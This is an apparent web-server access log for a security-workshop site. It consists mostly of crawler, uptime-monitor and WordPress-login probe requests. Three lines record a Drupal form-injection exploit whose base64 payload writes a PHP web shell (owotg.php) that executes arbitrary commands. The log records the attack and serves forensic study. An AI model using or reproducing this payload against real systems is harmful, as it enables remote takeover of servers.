59.124.153.166 - - [02/May/2018:18:33:29 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
77.88.47.40 - - [02/May/2018:18:34:14 -0400] "GET /2008/tmp/ HTTP/1.1" 403 3965 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:18:35:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.217 - - [02/May/2018:18:35:39 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 572715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [02/May/2018:18:35:46 -0400] "GET /2005/pc.shtml HTTP/1.1" 200 5415 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:18:35:48 -0400] "GET /2009/proceedings.shtml HTTP/1.1" 200 1451 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:18:36:06 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 200 336815 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.46.13.179 - - [02/May/2018:18:36:31 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 200 510608 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:18:37:04 -0400] "GET /2003/local.shtml HTTP/1.1" 200 5035 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
200.125.104.68 - - [02/May/2018:18:37:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
200.125.104.68 - - [02/May/2018:18:37:31 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.54 - - [02/May/2018:18:36:44 -0400] "GET /papers/1996/nspw1996-de_capitani_di_vimercati.pdf HTTP/1.1" 200 1459047 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.1 - - [02/May/2018:18:37:38 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 200 398940 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.141 - - [02/May/2018:18:37:58 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 200 103915 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.54 - - [02/May/2018:18:39:15 -0400] "GET /papers/1998/nspw1998-cowan.pdf HTTP/1.1" 200 1091850 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
181.120.49.185 - - [02/May/2018:18:40:08 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
181.120.49.185 - - [02/May/2018:18:40:08 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:18:40:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.141 - - [02/May/2018:18:41:38 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 200 1827528 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.1 - - [02/May/2018:18:44:11 -0400] "GET /papers/2005/nspw2005-maxion.pdf HTTP/1.1" 200 683698 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.1 - - [02/May/2018:18:44:41 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 200 905137 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
37.125.63.141 - - [02/May/2018:18:45:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.125.63.141 - - [02/May/2018:18:45:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.141 - - [02/May/2018:18:44:58 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 200 572662 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:18:45:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.219 - - [02/May/2018:18:48:04 -0400] "GET /papers/1997/nspw1997-riechmann.pdf HTTP/1.1" 200 1167834 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
197.89.243.252 - - [02/May/2018:18:48:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.89.243.252 - - [02/May/2018:18:48:30 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:18:49:56 -0400] "GET /2009/proceedings/1998/?C=D;O=A HTTP/1.1" 200 4362 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:18:50:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:18:50:22 -0400] "GET /2006/invite/papers.html HTTP/1.1" 200 4353 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.141 - - [02/May/2018:18:50:10 -0400] "GET /papers/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 200 1269880 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
71.68.213.113 - - [02/May/2018:18:51:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
71.68.213.113 - - [02/May/2018:18:51:01 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.236 - - [02/May/2018:18:53:15 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [02/May/2018:18:55:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.124.153.166 - - [02/May/2018:18:59:19 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
59.124.153.166 - - [02/May/2018:18:59:20 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
69.162.124.227 - - [02/May/2018:19:00:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.217 - - [02/May/2018:19:00:28 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [02/May/2018:19:03:11 -0400] "GET /2002/papers.content HTTP/1.1" 200 6810 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
79.3.147.8 - - [02/May/2018:19:03:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.3.147.8 - - [02/May/2018:19:03:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:19:05:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.162.22.29 - - [02/May/2018:19:06:40 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 714420 "-" "Mozilla/5.0 (compatible; linkdexbot/2.2; +http://www.linkdex.com/bots/)"
66.249.64.17 - - [02/May/2018:19:10:08 -0400] "GET /2011/sponsors HTTP/1.1" 200 6474 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:19:10:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:19:03:31 -0400] "GET /papers/2012/docs/p127.pdf HTTP/1.1" 200 2849750 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.141 - - [02/May/2018:19:10:11 -0400] "GET /papers/2008/nspw2008-molloy.pdf HTTP/1.1" 200 3153952 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.64.219 - - [02/May/2018:19:13:00 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 200 189194 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.200 - - [02/May/2018:19:13:22 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
77.88.47.40 - - [02/May/2018:19:06:01 -0400] "GET /papers/2012/docs/p127.pdf HTTP/1.1" 200 3118166 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:19:15:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:19:08:31 -0400] "GET /papers/2012/docs/p127.pdf HTTP/1.1" 200 2992346 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.236 - - [02/May/2018:19:16:45 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
83.216.92.246 - - [02/May/2018:19:19:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.216.92.246 - - [02/May/2018:19:19:28 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:19:20:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
220.181.125.142 - - [02/May/2018:19:21:20 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 304 3665 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
157.55.39.141 - - [02/May/2018:19:24:03 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 200 149973 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.64.217 - - [02/May/2018:19:24:12 -0400] "GET /current/cfp.shtml HTTP/1.1" 404 8008 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.215 - - [02/May/2018:19:25:18 -0400] "GET /2009/proceedings/1997/nspw1997-rahman.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:19:25:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
69.162.124.227 - - [02/May/2018:19:30:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.179 - - [02/May/2018:19:33:14 -0400] "GET /papers/2009/nspw2009-jakobsson.pdf HTTP/1.1" 200 294209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:19:34:32 -0400] "GET /node/34 HTTP/1.1" 200 6546 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:19:35:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.1 - - [02/May/2018:19:35:58 -0400] "GET /papers/2009/nspw2009-peisert.pdf HTTP/1.1" 200 1016096 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
194.187.251.6 - - [02/May/2018:19:37:20 -0400] "GET /node/70 HTTP/1.1" 200 7037 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
66.249.64.219 - - [02/May/2018:19:37:43 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:19:40:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.1 - - [02/May/2018:19:43:03 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 200 587868 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
144.76.162.206 - - [02/May/2018:19:43:26 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 200 1025744 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
5.9.145.132 - - [02/May/2018:19:43:40 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 200 1025744 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
5.9.94.207 - - [02/May/2018:19:43:55 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 200 1025744 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
69.162.124.227 - - [02/May/2018:19:45:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
201.35.252.168 - - [02/May/2018:19:46:19 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.35.252.168 - - [02/May/2018:19:46:21 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.23.174.51 - - [02/May/2018:19:46:38 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
182.186.175.252 - - [02/May/2018:19:47:10 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
182.186.175.252 - - [02/May/2018:19:47:11 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.73.199.239 - - [02/May/2018:19:47:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
199.16.157.183 - - [02/May/2018:19:48:40 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
54.67.59.131 - - [02/May/2018:19:48:55 -0400] "GET / HTTP/1.1" 200 6385 "http://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
77.88.47.40 - - [02/May/2018:19:49:57 -0400] "GET /2008/cfp.shtml HTTP/1.1" 200 8675 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.215 - - [02/May/2018:19:50:08 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:19:50:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
34.229.167.12 - - [02/May/2018:19:53:46 -0400] "GET /2018 HTTP/1.1" 200 6947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
34.224.25.152 - - [02/May/2018:19:53:46 -0400] "GET /2018 HTTP/1.1" 200 12432 "http://www.netaro.info/~zetaka/projects/ConfShare/update_history.rss" "Mozilla/5.0 (compatible; FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
5.34.85.85 - - [02/May/2018:19:54:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.34.85.85 - - [02/May/2018:19:54:07 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:19:55:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.179 - - [02/May/2018:19:55:33 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 200 510608 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
24.190.116.37 - - [02/May/2018:19:58:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
24.190.116.37 - - [02/May/2018:19:58:12 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
120.29.106.86 - - [02/May/2018:20:00:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
120.29.106.86 - - [02/May/2018:20:00:15 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:20:00:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.219 - - [02/May/2018:20:02:32 -0400] "GET /2018/dates HTTP/1.1" 200 6269 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.126.150.181 - - [02/May/2018:20:02:50 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.126.150.181 - - [02/May/2018:20:02:50 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
71.6.202.205 - - [02/May/2018:20:03:16 -0400] "GET / HTTP/1.1" 200 6398 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
157.55.39.141 - - [02/May/2018:20:03:07 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769875 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:20:05:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
91.242.17.127 - - [02/May/2018:20:06:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
91.242.17.127 - - [02/May/2018:20:06:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
36.110.211.41 - - [02/May/2018:20:07:29 -0400] "GET / HTTP/1.1" 200 11540 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
69.162.124.227 - - [02/May/2018:20:10:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
112.205.65.218 - - [02/May/2018:20:10:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.205.65.218 - - [02/May/2018:20:10:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.48.13.33 - - [02/May/2018:20:13:51 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.48.13.33 - - [02/May/2018:20:13:52 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
122.150.90.235 - - [02/May/2018:20:14:18 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/2009/proceedings/1993/nspw1993-strens.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
122.150.90.235 - - [02/May/2018:20:14:17 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 200 44356 "https://scholar.google.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
137.112.228.195 - - [02/May/2018:20:14:34 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:20:14:35 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
